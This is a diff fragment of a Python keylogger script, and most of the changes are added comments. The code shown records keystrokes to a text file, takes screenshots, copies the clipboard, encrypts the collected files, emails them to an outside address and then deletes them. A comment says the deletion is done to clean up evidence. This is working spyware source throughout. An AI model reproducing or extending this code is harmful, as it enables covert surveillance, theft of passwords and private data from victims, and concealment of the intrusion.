@@ -113,7 +113,8 @@ computer_info()
 
 screenshot()
 
-# This took a while to get working
+
+# iteration loop that includes a screenshot and a clipboard copy at the end of each iteration.
 num_iterations = 0  # keeps track of how many interations run
 currentTime = time.time()  # tracks the time
 stoppingTime = time.time() + time_iteration  # tracks the stopping time
@@ -135,14 +136,15 @@ while num_iterations < num_iterations_end:  # while statement for the iterations
             keys = []
 
 
+    # writes the key press to a .txt file
     def write_file(key):
         with open(file_path + extend + keys_info, "a") as f:
             for key in key:
-                k = str(key).replace("'", "")
+                k = str(key).replace("'", "")   # removes the "'" at the front and end of the key
                 if k.find("space") > 0:
                     f.write('\n')
                     f.close()
-                elif k.find("Key") == -1:
+                elif k.find("Key") == -1:       # and combines key presses so each line is a word  
                     f.write(k)
                     f.close()
 
@@ -182,7 +184,8 @@ for encrypting_file in files_encrypt:
 
     send_email(encrypted_names[count], encrypted_names[count], toAddress)
     count += 1
-
+    
+# waits for 120 seconds to delete files, making sure encryption completes
 time.sleep(120)
 
 # Deleting files in order to clean up evidence of something going on
